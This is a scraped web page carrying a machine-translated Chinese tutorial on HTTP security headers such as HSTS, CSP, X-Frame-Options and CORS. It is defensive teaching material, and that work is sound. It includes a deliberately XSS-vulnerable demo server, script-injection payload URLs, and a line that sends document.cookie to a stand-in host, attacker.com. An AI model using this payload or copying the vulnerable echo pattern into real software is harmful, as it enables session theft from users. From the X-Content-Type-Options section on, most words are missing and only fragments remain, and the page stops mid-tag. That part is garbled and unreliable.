<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🎋 🚡 ✌🏽 如何使用HTTP标头增强Web应用程序安全性 🍜 🥜 🦅</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="这是Web安全系列的第三部分：第二部分是“ Web安全：HTTP简介 ”，第一部分是“ 浏览器的工作原理-Web应用程序安全简介 ”。 

 正如我们在本系列前面的部分中所看到的，服务器除了发送客户端请求的内容之外，还可以发送HTTP标头以在响应中为客户端提供其他元数据。 然后允许客户端指定如何读取...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>如何使用HTTP标头增强Web应用程序安全性</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/edison/blog/434228/"><img src="https://habrastorage.org/getpro/habr/post_images/c8d/5c5/809/c8d5c5809e609fecf60c662139f248d2.jpg" alt="图片"><br><br> 这是Web安全系列的第三部分：第二部分是“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Web安全：HTTP简介</a> ”，第一部分是“ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">浏览器的工作原理-Web应用程序安全简介</a> ”。 <br><br> 正如我们在本系列前面的部分中所看到的，服务器除了发送客户端请求的内容之外，还可以发送HTTP标头以在响应中为客户端提供其他元数据。 然后允许客户端指定如何读取，缓存或保护特定资源。 <br><br> 浏览器现在实现了范围广泛的与安全性相关的标头，使攻击者更难以利用漏洞。 在本文中，我们将尝试讨论它们中的每一个，解释它们的使用方式，它们可以防止哪些攻击以及每个标题的历史记录。 <br><a name="habracut"></a><br><blockquote> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" title="EDISON软件-网络开发"><img align="left" width="153" height="75" src="https://habrastorage.org/webt/w0/zl/to/w0zltoxvysbr0yeinstkfvw1wbg.png" alt="EDISON软件-网络开发"></a> <br clear="right"> 该帖子是在EDISON Software的支持下撰写的，EDISON Software <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">力求获得俄罗斯程序员的荣誉，</a>并详细<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">分享</a>了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">其在开发复杂软件产品方面的经验</a> 。 </blockquote><h3>  HTTP严格传输安全性（HSTS） </h3><br> 自2012年底以来，由于严格的传输安全性，HTTPS Everywhere支持者使客户端始终使用HTTP协议的安全版本变得更加容易：非常简单的行<code>Strict-Transport-Security: max-age=3600</code>将告诉浏览器在接下来的一小时（3600秒）内不应通过不安全的协议与应用程序进行交互。 <br><br> 当用户尝试通过HTTP访问受HSTS保护的应用程序时，浏览器只是拒绝进一步操作，自动将<code>http://</code> URL转换为<code>https://</code> 。 <br><br> 您可以使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github.com/odino/wasec/tree/master/hsts</a>代码在本地进行检查。 您将需要按照自述文件中的说明进行操作（包括使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">mkcert</a>工具在计算机上为<code>localhost</code>安装受信任的SSL证书），然后尝试打开<code>https://localhost:7889</code> 。 <br><br> 在此示例中，有2个服务器：正在侦听<code>7889</code> HTTPS和在端口<code>7888</code>上的HTTP。 当您访问HTTPS服务器时，它将始终尝试将您重定向到可以使用的HTTP版本，因为HSTS在HTTPS服务器上不可用。 如果改为将<code>hsts=on</code>参数添加到URL，则浏览器会强制将链接转换为<code>https://</code>版本。 由于只能通过http协议访问<code>7888</code>上的服务器，因此您最终将看到一个类似于以下内容的页面。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/693/783/9e0/6937839e0473a7101847dfaba7a10a1d.png" alt="图片"><br><br> 您可能有兴趣知道用户首次访问您的网站时会发生什么，因为HSTS策略尚未预定义：攻击者可能会诱使用户进入您网站的<code>http://</code>版本并在那里进行攻击，因此仍有问题的余地。 这是一个严重的问题，因为HSTS是首次使用时的信任机制。 他试图确保在访问网站后，浏览器知道在后续交互中应使用HTTPS。 <br><br> 解决此问题的方法可能是维护一个庞大的支持HSTS的网站数据库，Chrome通过<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">hstspreload.org做到了</a>这<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">一点</a> 。 您必须首先建立策略，然后访问网站，然后查看是否可以将其添加到数据库中。 例如，我们可以看到Facebook在列表中。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ce/40b/830/6ce40b8307fa218f0f6f5f8cb3ccdad9.png" alt="图片"><br><br> 通过将您的网站提交到此列表，您可以提前告知浏览器您的网站使用HSTS，这样，即使客户端与服务器之间的首次交互也将通过安全通道进行。 但这很昂贵，因为您确实需要参加HSTS。 如果出于任何原因要从列表中删除您的网站，对于浏览器提供商来说，这都不是一件容易的事： <br><blockquote> 请记住，不能轻易取消预加载列表中的包含。 <br><br> 可以删除域，但是要向用户更新Chrome可能要花费数月的时间，我们不能保证其他浏览器。 如果不确定您是否可以长期支持整个站点及其所有子域的HTTPS，请不要请求将其包括在列表中。 <br>  -来源： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https</a> ： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">//hstspreload.org/</a> </blockquote> 这是因为提供程序无法保证所有用户都将使用其浏览器的最新版本，并且您的网站将从列表中删除。 请仔细考虑并根据您对HSTS的信任程度以及长期支持它的能力做出决定。 <br><br><h3>  HTTP公钥固定（HPKP） </h3><br>  HTTP公钥固定是一种机制，它使我们可以在连接到服务器时告诉浏览器期望哪些SSL证书。 此标头在首次使用时使用信任机制，例如HSTS，并且意味着客户端连接到我们的服务器后，它将存储证书信息以用于后续交互。 如果客户端发现服务器正在使用其他证书，则会礼貌地拒绝连接，这将使执行“中间人”攻击（MITM）变得非常困难。 <br><br>  HPKP策略如下所示： <br><br><pre> <code class="plaintext hljs">Public-Key-Pins: pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu="; pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3="; max-age=3600; includeSubDomains; report-uri="https://pkpviolations.example.org/collect"</code> </pre> <br> 标头使用证书哈希值宣布服务器将使用哪些证书（在本例中为两个），并包括其他信息，例如此指令的有效期（ <code>max-age = 3600</code> ）和其他一些详细信息。 不幸的是，深入了解我们如何保护公钥是没有意义的， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">因为Chrome不赞成使用此功能</a> -这表明采用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">该功能</a>注定会失败。 <br><br>  Chrome的解决方案不是非理性的，这仅仅是保护公钥所带来的风险的结果。 如果您丢失了证书或只是在测试过程中犯了一个错误，那么早前访问该站点的用户将无法访问该站点（在<code>max-age</code>指令的有效期内，通常为数周或数月）。 <br><br> 由于这些潜在的灾难性后果，HPKP的采用率非常低，并且有时<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">由于配置错误而无法使用大型网站</a> 。 鉴于以上所有情况，Chrome决定，如果没有HPKP提供的保护，用户会更好。 <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">安全研究人员并不完全反对这一决定</a> 。 <br><br><h3> 期望CT </h3><br> 当HPKP拒登时，出现了一个新的标头，以防止客户端使用欺诈性SSL证书： <code>Expect-CT</code> 。 <br><br> 此标头的目的是告诉浏览器它需要执行其他“后台检查”以验证证书是否真实：当服务器使用<code>Expect-CT</code>标头时，它基本上会要求客户端验证所使用的证书是否在开放透明证书日志中（CT）。 <br><br> 证书透明性计划是Google努力确保： <br><blockquote> 一个开放的平台，用于近乎实时地监视和审核SSL证书。 <br><br> 特别是，通过证书透明性，您可以检测由证书颁发机构错误颁发的SSL证书或从其他无缺陷证书颁发机构恶意获取的SSL证书。 它还使您可以识别已实施欺诈和恶意颁发证书的证书颁发机构。 <br>  -来源： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https</a> ： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">//www.certificate-transparency.org/</a> </blockquote> 标头采用以下形式： <br><br><pre> <code class="plaintext hljs">Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"</code> </pre> <br> 在此示例中，服务器询问浏览器： <br><br><ul><li> 启用CT检查当前应用程序的时间为1小时（3600秒） </li><li>  <code>enforce</code>执行此策略，并在违反情况下拒绝对应用程序的访问 </li><li> 如有违反，将报告发送到指定的URL </li></ul><br> 证书透明性计划的目标是比以前使用的任何其他方法更早，更快，更准确地检测错误颁发的或恶意的证书（以及欺诈的证书颁发机构）。 <br><br> 通过启用<code>Expect-CT</code>标头，您可以采取这一举措来改善应用程序的安全性状态。 <br><br><h3>  X帧选项 </h3><br> 假设您看到这样的网页 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/2f5/87f/f15/2f587ff15a4e613cc91e13122d49e22b.png" alt="图片"><br><br> 一旦单击链接，您就会知道您的银行帐户中的所有钱都已消失。 发生什么事了 <br><br> 您是点击劫持攻击的受害者。 <br><br> 攻击者将您定向到他的网站，该网站显示一个非常诱人的点击链接。 不幸的是，他还使用<code>your-bank.com/transfer?amount=-1&amp;[attacker@gmail.com]</code>嵌入了iframe页面，但通过将透明度设置为0％来隐藏了它。 我们以为我们点击了原始页面，试图赢得一个全新的胜利，但是浏览器却改为固定了对iframe的点击，这是确认汇款的危险点击。 <br><br> 大多数银行系统要求您提供一次PIN来确认交易，但是您的银行没有赶上时间，所有的钱都丢失了。 <br><br> 该示例非常极端，但是它应该使您了解<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">使用点击劫持</a>进行<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">攻击</a>的后果。 用户打算单击特定的链接，而浏览器将导致单击嵌入在框架中的“不可见”页面。 <br><br> 我在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github.com/odino/wasec/tree/master/clickjacking中</a>包含了此漏洞的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">示例</a> 。 如果运行示例并尝试单击“有吸引力的”链接，则将看到iframe拦截了真正的点击，这使其不透明，从而使您更容易发现问题。 一个示例应该在<code><a href="">http://localhost:7888</a></code> 。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e11/a28/3a9/e11a283a9d4f69c80622666fdcc647c2.png" alt="图片"><br><br> 幸运的是，浏览器为这个问题提出了一个简单的解决方案： <code>X-Frame-Options</code> （XFO），它使您可以决定是否可以将应用程序作为iframe嵌入到外部网站上。  XFO受到Internet Explorer 8的广泛欢迎，于2009年首次引入，至今仍受所有主要浏览器的支持。 <br><br> 它的工作方式如下：当浏览器看到iframe时，它将对其进行加载并检查其XFO是否允许其在呈现前被包含在当前页面中。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8c3/61e/04e/8c361e04e5a18bac008a106e47090dc1.png" alt="图片"><br><br> 支持的值： <br><br><ul><li>  <code>DENY</code> ：该网页无法嵌入任何地方。 这是最高的保护级别，因为它不允许任何人嵌入我们的内容。 </li><li>  <code>SAMEORIGIN</code> ：只有与当前域相同的域中的页面才能插入此页面。 这意味着，如果<code>example.com/embedded</code>的策略设置为<code>SAMEORIGIN</code>则可以加载<code>example.com/embedded</code> 。 这是一个比较平静的政策，允许特定网站的所有者在其应用程序中嵌入自己的页面。 </li><li>  <code>ALLOW-FROM uri</code> ：允许从指定的URI进行附件。 例如，我们可以允许外部授权网站使用<code>ALLOW-FROM https://external.com</code>嵌入我们的内容。 当您要允许第三方开发人员通过iframe嵌入内容时，通常会使用此功能。 </li></ul><br> 包含最严格的XFO策略的HTTP响应示例如下： <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK Content-Type: application/json X-Frame-Options: DENY ...</code> </pre> <br> 为了演示打开XFO时浏览器的行为，我们可以简单地将示例URL更改为<code>http://localhost:7888 /?xfo=on</code> 。  <code>xfo=on</code>参数告诉服务器在响应中包含<code>X-Frame-Options: deny</code> ，我们可以看到浏览器如何限制对iframe的访问： <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ecf/751/7b7/ecf7517b7954476cacc64a7e3cb38d87.png" alt="图片"><br><br>  XFO被认为是防止基于框架的基于单击的攻击的最佳方法，直到几年后又出现了另一个标题-内容安全策略或简称CSP。 <br><br><h3> 内容安全政策（CSP） </h3><br>  <code>Content-Security-Policy</code>标头（缩写为CSP）提供了下一代实用程序，可防止从XSS（跨站点脚本）到单击拦截（单击劫持）的各种攻击。 <br><br> 要了解CSP如何帮助我们，您首先需要考虑一个攻击媒介。 假设我们刚刚创建了自己的Google搜索引擎，其中有一个带有输入按钮的简单输入字段。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e92/afc/397/e92afc3972e0d40182d68544e8e51d5c.png" alt="图片"><br><br> 此Web应用程序没有神奇的功能。 很简单 <br><br><ul><li> 显示表格 </li><li> 允许用户搜索 </li><li> 显示搜索结果以及用户搜索的关键字 </li></ul><br> 当我们执行简单搜索时，应用程序将返回以下内容： <br><br><img src="https://habrastorage.org/getpro/habr/post_images/5a7/977/79b/5a797779b4394913cbfef82a6e0dafe9.png" alt="图片"><br><br> 好厉害 我们的应用程序非常了解我们的搜索并找到了相似的图像。 如果我们深入研究<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github.com/odino/wasec/tree/master/xss上</a>的源代码，我们将很快意识到该应用程序存在安全问题，因为用户搜索的任何关键字都直接以HTML格式打印： <br><br><pre> <code class="xml hljs">var qs = require('querystring') var url = require('url') var fs = require('fs') require('http').createServer((req, res) =&gt; { let query = qs.parse(url.parse(req.url).query) let keyword = query.search || '' let results = keyword ? `You searched for "${keyword}", we found:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://placekitten.com/200/300"</span></span></span><span class="hljs-tag"> /&gt;</span></span>` : `Try searching...` res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results)) }).listen(7888) <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Search The Web<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"search"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"__KEYWORD__"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"results"</span></span></span><span class="hljs-tag">&gt;</span></span> __RESULTS__ <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br> 这是不愉快的结果。 攻击者可以创建一个特定的链接，该链接可以在受害者的浏览器中执行任意JavaScript。 <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3ee/628/c3a/3ee628c3af5ea6176284c5451423957c.png" alt="图片"><br><br> 如果您有时间和耐心在本地运行该示例，则可以快速了解CSP的全部功能。 我添加了一个包含CSP的查询字符串参数，因此我们可以尝试转到启用了CSP的恶意URL： <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">本地主机</a> ：7888 /？搜索=％3Cscript +类型％3D 3D％22text％2Fjavascript％22％3Ealert％28％27You％20have％20been％20PWNED％27％29％3C％2Fscript％3E＆csp = on </blockquote><img src="https://habrastorage.org/getpro/habr/post_images/903/763/6a1/9037636a1b4baa19cced586860caa993.png" alt="图片"><br><br> 如上例所示，我们告诉浏览器，我们的CSP策略仅允许包含来自当前URL相同源的脚本，我们可以通过使用curl访问URL并查看响应标头来轻松检查脚本： <br><br><pre> <code class="plaintext hljs">$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&amp;csp=on" HTTP/1.1 200 OK X-XSS-Protection: 0 Content-Security-Policy: default-src 'self' Date: Sat, 11 Aug 2018 10:46:27 GMT Connection: keep-alive</code> </pre> <br> 由于XSS攻击是使用嵌入式脚本（直接嵌入HTML内容的脚本）进行的，因此浏览器礼貌地拒绝执行该脚本，从而确保了用户的安全。 想象一下，攻击者不仅会显示警告对话框，还会通过一些JavaScript代码将重定向设置为他自己的域，如下所示： <br><br><pre> <code class="plaintext hljs">window.location = `attacker.com/${document.cookie}`</code> </pre> <br> 他们可能窃取所有用户cookie，其中可能包含非常机密的数据（在下一篇文章中将对此进行更多介绍）。 <br><br> 到现在为止，应该清楚CSP如何帮助我们防止对Web应用程序的大量攻击。 您定义了一个策略，浏览器将严格遵守该策略，拒绝运行会违反该策略的资源。 <br><br>  CSP的一个有趣选项是“仅报告”模式。 除了使用<code>Content-Security-Policy</code>标头，您还可以通过告诉浏览器仅报告错误而不阻止脚本执行等来检查CSP在站点上的效果。使用<code>Content-Security-Policy-Report-Only</code>标头。 <br><br> 这些报告将使您了解要部署的CSP策略可能导致哪些重要更改，并相应地进行更正。 我们甚至可以提供报告URL，浏览器将向我们发送报告。 这是一个完整的仅报告策略示例： <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector</code> </pre> <br>  CSP策略本身可能会有些复杂，例如，在以下示例中： <br><br><pre> <code class="plaintext hljs">Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com</code> </pre> <br> 该策略定义以下规则： <br><br><ul><li> 可执行脚本（例如JavaScript）只能从<code>scripts.example.com</code>下载 </li><li> 可以从任何来源下载图像（ <code>img-src: *</code> ） </li><li> 可以从两个来源下载视频或音频内容： <code>medias.example.com</code>和<code>medias.legacy.example.com</code> </li></ul><br> 如您所见，可能有很多政客，如果我们想为用户提供最大的保护，这可能是一个相当繁琐的过程。 但是，编写全面的CSP策略是向我们的Web应用程序添加额外安全层的重要一步。 <br><br> 有关CSP的更多信息，建议您使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a> 。 <br><br><h3>  X-XSS保护 </h3><br> 尽管已由CSP代替，但<code>X-XSS-Protection</code>标头提供了相同类型的保护。 此标头用于缓解不完全支持CSP的旧版浏览器中的XSS攻击。  Firefox不支持此标头。 <br><br> 它的语法与我们刚刚看到的非常相似： <br><br><pre> <code class="plaintext hljs">X-XSS-Protection: 1; report=http://xssviolations.example.com/collector</code> </pre> <br> 当服务器在没有任何验证的情况下打印输入的文本时，反射的XSS是最常见的攻击类型，这正是此标头真正解决的地方。 如果您想亲自查看它，建议您在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github.com/odino/wasec/tree/master/xss上</a>尝试该示例，因为通过在URL <code>xss=on</code>添加<code>xss=on</code>可以显示启用XSS保护时浏览器的功能。 。 如果我们在搜索字段中输入了恶意字符串，例如，浏览器会礼貌地拒绝执行脚本并解释其决定的原因： <br><br><pre> <code class="plaintext hljs">The XSS Auditor refused to execute a script in 'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=on' because its source code was found within the request. The server sent an 'X-XSS-Protection' header requesting this behavior.</code> </pre> <br> 当未在网页上指定CSP或XSS策略时，Chrome中的默认行为更加有趣。 我们可以通过将<code>xss=off</code>参数添加到URL中来测试脚本（ <code>http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&amp;xss=off</code> ）： <br><br><img src="https://habrastorage.org/getpro/habr/post_images/938/8c4/6fd/9388c46fd9f6c9370d0f9ff3b2a65210.png" alt="图片"><br><br> 令人惊讶的是，Chrome足够小心以防止页面渲染，这使得创建镜像XSS变得困难。 令人印象深刻的浏览器。 <br><br><h3> 功能政策 </h3><br>  2018年7月，安全研究员<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Scott Helm</a>发布了一篇非常有趣的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">博客文章，</a>详细介绍了新的安全标题： <code>Feature-Policy</code> 。 <br><br> 当前只有很少的浏览器（在撰写本文时，Chrome和Safari）支持该标头，这使我们可以确定当前页面上是否启用了特定的浏览器功能。 使用与CSP非常相似的语法，我们应该毫无疑问地理解功能策略的含义，例如： <br><br><pre> <code class="plaintext hljs">Feature-Policy: vibrate 'self'; push *; camera 'none'</code> </pre> <br> 如果我们不确定该政策如何影响浏览器API，我们可以对其进行简单分析： <br><br><ul><li>  <code>vibrate 'self'</code> ：允许当前页面使用振动API和当前站点上的任何框架。 </li><li>  <code>push *</code> ：当前页面和任何框架都可以使用推送通知API </li><li>  <code>camera 'none'</code> ：在此页面和任何框架上均拒绝访问摄像头API </li></ul><br> 功能政策有一点历史。 例如，如果您的网站允许用户拍摄自拍或录制音频，则在其他情况下使用限制通过您的页面访问API的策略将非常有用。 <br><br><h3>  X内容类型选项 </h3><br> 有时，智能浏览器功能最终会损害我们的安全性。 一个典型的例子是MIME嗅探，它是Internet Explorer中流行的一种技术。 <br><br> MIME- —       ( )    . ,      <code>/awesome-picture.png</code> ,          (, <code>Content-Type: text/plain</code> ).     ,       . <br><br>    , IE   ,    MIME-:     «»  ,  ,      ,      <code>Content-Type</code> ,   ,  ,       ,  . <br><br>     -,       ,  ,     <code>/test.jpg</code> ,   JavaScript. ,   ?    ,       HTML ,     ,   «»,     .    ,  ,   ,      . <br><br>    ,     <code>X-Content-Type-Options: nosniff</code> ,    MIME-:     ,   ,           ,       .  ,   ,       ,       . <br><br><h3> Cross-Origin Resource Sharing (CORS) </h3><br>    JavaScript HTTP-      .  , AJAX-  <code>example.com</code>     <code>example.com</code> . <br><br>    ,         —  cookie,       . ,       <code>win-a-hummer.com</code> ,     AJAX  <code>your-bank.com</code> .     - ,    HTTP-    ,    ,   ,    . <br><br>         AJAX   ,        Cross Origin Resource Sharing (CORS),  ,     . <br><br> ,    CORS,  ,        ,     «»  CORS. <br><br> ,       ,  ,     <code>Access-Control-Allow-Origin</code>    , ,       . <br><br>       <code>Access-Control-Allow-Origin: *</code> ,         ,     ,   URL-,       ,   <code>Access-Control-Allow-Origin: https://example.com</code> . <br><br>        <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github.com/odino/wasec/tree/master/cors</a> ,  ,         .   ,    AJAX  <code>test-cors</code>  <code>test-cors-2</code>      .   test-cors-2    CORS,   ,   .    <code>http://cors-test:7888/?cors=on</code> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/bae/c57/e2f/baec57e2f48c17748ce2d6202985c559.png" alt="图片"><br><br>      <code>cors</code>  URL,         : <br><br><img 